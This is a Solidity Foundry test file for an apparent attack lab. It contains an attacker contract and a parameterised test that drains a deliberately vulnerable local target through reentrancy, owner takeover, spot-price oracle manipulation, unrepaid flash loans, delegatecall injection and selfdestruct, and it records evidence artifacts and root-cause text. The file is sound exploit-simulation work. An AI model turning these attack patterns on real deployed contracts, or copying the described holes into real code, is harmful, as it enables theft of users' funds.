// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitBase} from "./ExploitBase.t.sol";
import {CustomTarget, CustomImplementation, IFlashBorrower} from "../src/CustomTarget.sol";
import {CustomNoise, CustomNoiseDesk} from "../src/CustomNoise.sol";

/**
 * @title CustomAttacker
 * @notice Attacker contract used by every family in the Custom Attack Lab. It
 *         holds the re-entrancy receiver, the flash-loan callback, the oracle
 *         pump and the delegatecall driver.
 */
contract CustomAttacker is IFlashBorrower {
    CustomTarget public immutable target;
    uint256 public reentries;
    uint256 public maxReentries;
    uint256 public lastLoan;
    uint256 public lastRecon;

    constructor(CustomTarget targetContract) {
        target = targetContract;
    }

    receive() external payable {
        if (reentries < maxReentries) {
            reentries += 1;
            target.withdraw();
        }
    }

    /// @notice Deposit then withdraw once; receive() re-enters one more time.
    function seedReentrancy(uint256 amount) external {
        reentries = 0;
        maxReentries = 1;
        target.deposit{value: amount}();
        target.withdraw();
        maxReentries = 0;
    }

    function takeOwnership() external {
        target.setOwner(address(this));
    }

    function privilegedDrain(uint256 amount) external {
        target.drain(amount);
    }

    function postCollateral(uint256 tokens) external {
        target.postCollateral(tokens);
    }

    function pump(uint256 amount) external payable {
        target.pump{value: amount}();
    }

    function borrow(uint256 amount) external {
        target.borrow(amount);
    }

    function flashDrain(uint256 amount) external {
        target.flashLoan(amount, address(this));
    }

    function onFlashLoan(uint256 amount) external {
        lastLoan = amount;
    }

    function installImplementation(address impl) external {
        target.upgradeTo(impl);
    }

    function execSweep(address payable to, uint256 amount) external {
        target.execute(abi.encodeWithSignature("sweep(address,uint256)", to, amount));
    }

    /// @notice Reconnaissance used by the selfdestruct family: reads the target
    ///         so the session has real attacker transactions before the kill.
    function recon() external returns (uint256) {
        lastRecon = target.spotPrice();
        return lastRecon;
    }

    function destroyTarget() external {
        target.destroy();
    }
}

/**
 * @title CustomAttackTest
 * @notice ONE test, parameterised by environment variables, that drives the
 *         CustomTarget through the attack family selected at run time:
 *
 *           MAYALL_VECTOR   reentrancy | access-control | oracle-manipulation |
 *                           flash-loan | delegatecall | selfdestruct
 *           MAYALL_TXS      number of attacker transactions (1..12, default 3)
 *           MAYALL_AMOUNT   total wei drained (default 6 ether)
 *           MAYALL_SEED     noise seed (default 1)
 *           MAYALL_ARTIFACT artifact base name (default "custom-attack")
 *
 *         The assertions are real ETH-flow invariants measured around the
 *         attack window, not tautologies:
 *           attackerGain  == requested drain
 *           targetDeficit == requested drain
 */
contract CustomAttackTest is ExploitBase {
    function testCustomAttack() public {
        string memory vectorName = vm.envOr("MAYALL_VECTOR", string("reentrancy"));
        uint256 txs = vm.envOr("MAYALL_TXS", uint256(3));
        uint256 requested = vm.envOr("MAYALL_AMOUNT", uint256(6 ether));
        uint256 noiseSeed = vm.envOr("MAYALL_SEED", uint256(1));
        string memory artifactName = vm.envOr("MAYALL_ARTIFACT", string("custom-attack"));

        if (txs < 1) txs = 1;
        if (txs > 12) txs = 12;
        if (requested == 0) requested = 1;
        if (txs > requested) txs = requested;

        CustomTarget.Family fam = familyOf(vectorName);

        // ── deployment and victim funding ───────────────────────────────
        CustomTarget target = new CustomTarget();
        target.setFamily(fam);
        CustomAttacker attacker = new CustomAttacker(target);
        CustomImplementation impl = new CustomImplementation();
        CustomNoise noise = new CustomNoise();
        CustomNoiseDesk desk = new CustomNoiseDesk(noise);

        vm.deal(address(this), 10_000 ether);
        vm.deal(address(attacker), 1_000 ether);
        vm.label(address(target), "CustomTarget");
        vm.label(address(attacker), "CustomAttacker");
        vm.label(address(noise), "CustomNoise");
        vm.label(address(desk), "CustomNoiseDesk");

        uint256 liquidity;
        if (fam == CustomTarget.Family.Selfdestruct) {
            liquidity = requested;
        } else {
            liquidity = requested * 2 + 1 ether;
        }
        target.deposit{value: liquidity}();

        if (fam == CustomTarget.Family.OracleManipulation) {
            // A thin pool is the point: 1 ETH against 10 tokens.
            target.seedPool{value: 1 ether}(10e18);
            attacker.postCollateral(100e18);
        }

        // ── attack window ───────────────────────────────────────────────
        uint256 targetBefore = address(target).balance;
        uint256 attackerBefore = address(attacker).balance;

        uint256 snap = vm.snapshot();
        vm.record();
        vm.recordLogs();

        uint256 slice = requested / txs;
        uint256 remainder = requested % txs;

        uint256[] memory gasUsed = new uint256[](txs);
        uint256[] memory amounts = new uint256[](txs);
        uint256 resolvedSum;

        for (uint256 i; i < txs; i++) {
            uint256 amount = slice + (i == txs - 1 ? remainder : 0);
            if (amount == 0) amount = 1;
            amounts[i] = amount;
            resolvedSum += amount;

            uint256 gasStart = gasleft();
            // Benign traffic is interleaved at the head and tail of the session,
            // not on every iteration: enough top-level depth without burying the
            // attack in identical noise frames.
            if (i == 0 || (txs > 1 && i == txs - 1)) {
                desk.brush(noiseSeed + i);
            }

            if (fam == CustomTarget.Family.Reentrancy) {
                attacker.seedReentrancy(amount);
            } else if (fam == CustomTarget.Family.AccessControl) {
                if (i == 0) attacker.takeOwnership();
                attacker.privilegedDrain(amount);
            } else if (fam == CustomTarget.Family.OracleManipulation) {
                uint256 pumpAmount = amount / 2;
                if (pumpAmount == 0) pumpAmount = 1;
                attacker.pump(pumpAmount);
                attacker.borrow(amount + pumpAmount);
            } else if (fam == CustomTarget.Family.FlashLoan) {
                attacker.flashDrain(amount);
            } else if (fam == CustomTarget.Family.Delegatecall) {
                if (i == 0) attacker.installImplementation(address(impl));
                attacker.execSweep(payable(address(attacker)), amount);
            } else {
                if (i == 0) attacker.takeOwnership();
                if (i == txs - 1) {
                    attacker.destroyTarget();
                } else {
                    attacker.recon();
                }
            }
            gasUsed[i] = gasStart - gasleft();
        }
        noise.ping();

        // The requested amount must have been fully drained, not silently
        // clamped: the harness fails loudly if the scenario under-delivers.
        assertEq(resolvedSum, requested, "slices must sum to the requested drain");

        (, bytes32[] memory rawSlots) = vm.accesses(address(target));
        bytes32[] memory writeSlots = dedupeSlots(rawSlots);
        bytes32[] memory afterValues = readAfter(address(target), writeSlots);

        uint256 targetAfter = address(target).balance;
        uint256 attackerAfter = address(attacker).balance;
        uint256 gain = attackerAfter - attackerBefore;
        uint256 deficit = targetBefore - targetAfter;

        // ── genuine invariants ──────────────────────────────────────────
        assertEq(gain, requested, "attacker gain must equal the requested drain");
        assertEq(deficit, requested, "target deficit must equal the requested drain");
        assertGt(deficit, 0, "target must lose funds");
        assertGt(gain, 0, "attacker must extract funds");

        // ── evidence capture ────────────────────────────────────────────
        vm.revertTo(snap);
        bytes32[] memory beforeValues = readBefore(address(target), writeSlots);

        SlotWrite[] memory writes = new SlotWrite[](writeSlots.length);
        string[] memory labels = new string[](writeSlots.length);
        string[] memory kinds = new string[](writeSlots.length);
        uint256 changed;
        for (uint256 i; i < writeSlots.length; i++) {
            writes[i] = SlotWrite(writeSlots[i], beforeValues[i], afterValues[i]);
            labels[i] = slotLabel(writeSlots[i], address(attacker), address(this), writeSlots.length);
            kinds[i] = slotKind(writeSlots[i], address(attacker));
            if (beforeValues[i] != afterValues[i]) changed++;
        }
        assertGt(changed, 0, "at least one storage slot must mutate in the attack window");

        // ── artifact document ───────────────────────────────────────────
        uint256 stepCount = txs + 2;
        string[] memory titles = new string[](stepCount);
        string[] memory descriptions = new string[](stepCount);
        uint256[] memory stepGas = new uint256[](stepCount);
        uint256[] memory stepValues = new uint256[](stepCount);

        titles[0] = "Victim funds the shared vault";
        descriptions[0] = string.concat(
            "A victim depositor seeds the target with ",
            eth(liquidity),
            " ETH. This balance is the loss surface for every family."
        );
        stepGas[0] = 0;
        stepValues[0] = liquidity;

        for (uint256 i; i < txs; i++) {
            titles[i + 1] = string.concat(actionTitle(fam), " #", u(i + 1));
            descriptions[i + 1] = actionDescription(fam, amounts[i]);
            stepGas[i + 1] = gasUsed[i];
            stepValues[i + 1] = fam == CustomTarget.Family.Reentrancy ? amounts[i] : 0;
        }

        titles[stepCount - 1] = "Attacker walks away with the proceeds";
        descriptions[stepCount - 1] = string.concat(
            "Net movement over the attack window: attacker +",
            eth(gain),
            " ETH, target -",
            eth(deficit),
            " ETH. The balance movement is asserted in the test, not inferred."
        );
        stepGas[stepCount - 1] = 0;
        stepValues[stepCount - 1] = gain;

        address[] memory balAddrs = new address[](3);
        string[] memory balLabels = new string[](3);
        uint256[] memory balBefore = new uint256[](3);
        uint256[] memory balAfter = new uint256[](3);

        balAddrs[0] = address(target);
        balLabels[0] = "CustomTarget";
        balBefore[0] = targetBefore;
        balAfter[0] = targetAfter;

        balAddrs[1] = address(attacker);
        balLabels[1] = "CustomAttacker";
        balBefore[1] = attackerBefore;
        balAfter[1] = attackerAfter;

        balAddrs[2] = address(this);
        balLabels[2] = "Victim EOA";
        balBefore[2] = 10_000 ether - liquidity;
        balAfter[2] = 10_000 ether - liquidity;

        string[] memory logNames = new string[](3);
        string[] memory logArgs = new string[](3);
        logNames[0] = "VictimDeposit";
        logArgs[0] = string.concat("amount=", u(liquidity));
        logNames[1] = eventName(fam);
        logArgs[1] = string.concat("attacker=", vm.toString(address(attacker)), " amount=", u(requested));
        logNames[2] = "SessionNoisePing";
        logArgs[2] = string.concat("seed=", u(noiseSeed));

        string memory json = artifactJson(
            string.concat("custom-", vectorName),
            vectorLabel(fam),
            "Ethereum",
            "CustomTarget",
            vm.toString(address(target)),
            vm.toString(address(attacker)),
            true,
            requested,
            rootCause(fam),
            severityLabel(fam),
            buildStepsJson(titles, descriptions, stepGas, stepValues),
            buildBalancesJson(balAddrs, balLabels, balBefore, balAfter),
            buildStorageJson(vm.toString(address(target)), "CustomTarget", writes, labels, kinds),
            buildLogsJson(logNames, logArgs)
        );

        writeArtifact(artifactName, json);
    }

    /* ─────────────────────── family mapping ─────────────────────── */

    function familyOf(string memory name) internal pure returns (CustomTarget.Family) {
        bytes32 h = keccak256(bytes(name));
        if (h == keccak256("reentrancy")) return CustomTarget.Family.Reentrancy;
        if (h == keccak256("access-control")) return CustomTarget.Family.AccessControl;
        if (h == keccak256("oracle-manipulation")) return CustomTarget.Family.OracleManipulation;
        if (h == keccak256("flash-loan")) return CustomTarget.Family.FlashLoan;
        if (h == keccak256("delegatecall")) return CustomTarget.Family.Delegatecall;
        if (h == keccak256("delegatecall-injection")) return CustomTarget.Family.Delegatecall;
        if (h == keccak256("selfdestruct")) return CustomTarget.Family.Selfdestruct;
        if (h == keccak256("self-destruct")) return CustomTarget.Family.Selfdestruct;
        return CustomTarget.Family.Reentrancy;
    }

    function vectorLabel(CustomTarget.Family fam) internal pure returns (string memory) {
        if (fam == CustomTarget.Family.Reentrancy) return "Reentrancy";
        if (fam == CustomTarget.Family.AccessControl) return "Access Control";
        if (fam == CustomTarget.Family.OracleManipulation) return "Oracle Manipulation";
        if (fam == CustomTarget.Family.FlashLoan) return "Flash Loan";
        if (fam == CustomTarget.Family.Delegatecall) return "Delegate Call Injection";
        return "Self Destruct";
    }

    function severityLabel(CustomTarget.Family fam) internal pure returns (string memory) {
        if (fam == CustomTarget.Family.Selfdestruct) return "high";
        if (fam == CustomTarget.Family.AccessControl) return "high";
        if (fam == CustomTarget.Family.FlashLoan) return "high";
        return "critical";
    }

    function rootCause(CustomTarget.Family fam) internal pure returns (string memory) {
        if (fam == CustomTarget.Family.Reentrancy) {
            return "withdraw() transfers ETH before zeroing balances[msg.sender]; receive() re-enters and the vault pays the same balance again. Classic reentrancy with no guard and no checks-effects-interactions discipline.";
        }
        if (fam == CustomTarget.Family.AccessControl) {
            return "setOwner() is missing the onlyOwner modifier, so the owner slot is compromised by any caller; drain() additionally trusts a tx.origin owner check. The result is an unauthorized privileged path.";
        }
        if (fam == CustomTarget.Family.OracleManipulation) {
            return "The oracle is the pool's own spot price: borrow() values collateral from reserves with no TWAP and no deviation bound, so the attacker moves the price inside the same transaction.";
        }
        if (fam == CustomTarget.Family.FlashLoan) {
            return "flashLoan() sends the pool balance to the borrower and never verifies settlement. There is no repayment check, no fee and no economic guard, so the flash loan is simply a free transfer.";
        }
        if (fam == CustomTarget.Family.Delegatecall) {
            return "execute() delegatecalls into an implementation installed by an unauthenticated upgradeTo(). The attacker-controlled implementation runs in the host context and sweeps the host balance.";
        }
        return "destroy() is reachable after the unguarded setOwner(), and selfdestruct forwards the entire escrow balance to the caller-chosen recipient.";
    }

    function actionTitle(CustomTarget.Family fam) internal pure returns (string memory) {
        if (fam == CustomTarget.Family.Reentrancy) return "Re-entrant withdrawal";
        if (fam == CustomTarget.Family.AccessControl) return "Owner takeover and privileged drain";
        if (fam == CustomTarget.Family.OracleManipulation) return "Spot price pump and borrow";
        if (fam == CustomTarget.Family.FlashLoan) return "Unsettled flash borrow";
        if (fam == CustomTarget.Family.Delegatecall) return "Injected implementation sweep";
        return "Forced-transfer preparation";
    }

    function actionDescription(CustomTarget.Family fam, uint256 amount) internal pure returns (string memory) {
        if (fam == CustomTarget.Family.Reentrancy) {
            return string.concat(
                "Attacker deposits ",
                eth(amount),
                " ETH then calls withdraw(); receive() re-enters once and the vault pays the balance twice."
            );
        }
        if (fam == CustomTarget.Family.AccessControl) {
            return string.concat(
                "Attacker rewrites the owner slot, then calls drain(",
                u(amount),
                ") which satisfies the tx.origin / owner check."
            );
        }
        if (fam == CustomTarget.Family.OracleManipulation) {
            return string.concat(
                "Attacker pumps the spot reserve and borrows ",
                u(amount),
                " wei more than the manipulated borrow limit would justify."
            );
        }
        if (fam == CustomTarget.Family.FlashLoan) {
            return string.concat(
                "Attacker flash-borrows ",
                u(amount),
                " wei; the pool settles without checking that anything was returned."
            );
        }
        if (fam == CustomTarget.Family.Delegatecall) {
            return string.concat(
                "Attacker-supplied implementation delegatecalled from the target sweeps ",
                u(amount),
                " wei of host balance."
            );
        }
        return "Attacker reads the target before the kill transaction that force-transfers the escrow.";
    }

    function eventName(CustomTarget.Family fam) internal pure returns (string memory) {
        if (fam == CustomTarget.Family.Reentrancy) return "Withdrawn";
        if (fam == CustomTarget.Family.AccessControl) return "Drained";
        if (fam == CustomTarget.Family.OracleManipulation) return "Borrowed";
        if (fam == CustomTarget.Family.FlashLoan) return "FlashSettled";
        if (fam == CustomTarget.Family.Delegatecall) return "ImplementationSet";
        return "Destroyed";
    }

    /* ─────────────────────── storage labelling ─────────────────────── */

    /**
     * @dev CustomTarget packs `owner` (20 bytes) and `family` (1 byte) into
     *      slot 0, so the static slots are:
     *        0 owner + family | 1 balances | 2 totalDeposited | 3 pool.ethReserve
     *        4 pool.tokenReserve | 5 collateral | 6 debt | 7 implementation
     *        8 flashNonce
     */
    function slotLabel(
        bytes32 slot,
        address attacker,
        address victim,
        uint256 index
    ) internal pure returns (string memory) {
        if (slot == bytes32(uint256(0))) return "owner";
        if (slot == bytes32(uint256(1))) return "balances";
        if (slot == bytes32(uint256(2))) return "totalDeposited";
        if (slot == bytes32(uint256(3))) return "pool.ethReserve";
        if (slot == bytes32(uint256(4))) return "pool.tokenReserve";
        if (slot == bytes32(uint256(5))) return "collateral";
        if (slot == bytes32(uint256(6))) return "debt";
        if (slot == bytes32(uint256(7))) return "implementation";
        if (slot == bytes32(uint256(8))) return "flashNonce";
        if (slot == mappingSlot(attacker, 1)) return "balances[attacker]";
        if (slot == mappingSlot(victim, 1)) return "balances[victim]";
        if (slot == mappingSlot(attacker, 5)) return "collateral[attacker]";
        if (slot == mappingSlot(attacker, 6)) return "debt[attacker]";
        return string.concat("state.slot", u(index));
    }

    function slotKind(bytes32 slot, address attacker) internal pure returns (string memory) {
        if (slot == bytes32(uint256(0))) return "flag";
        if (slot == mappingSlot(attacker, 1)) return "balance";
        if (slot == bytes32(uint256(1)) || slot == bytes32(uint256(5)) || slot == bytes32(uint256(6))) return "state";
        return "state";
    }

    function mappingSlot(address key, uint256 position) internal pure returns (bytes32) {
        return keccak256(abi.encode(key, position));
    }
}
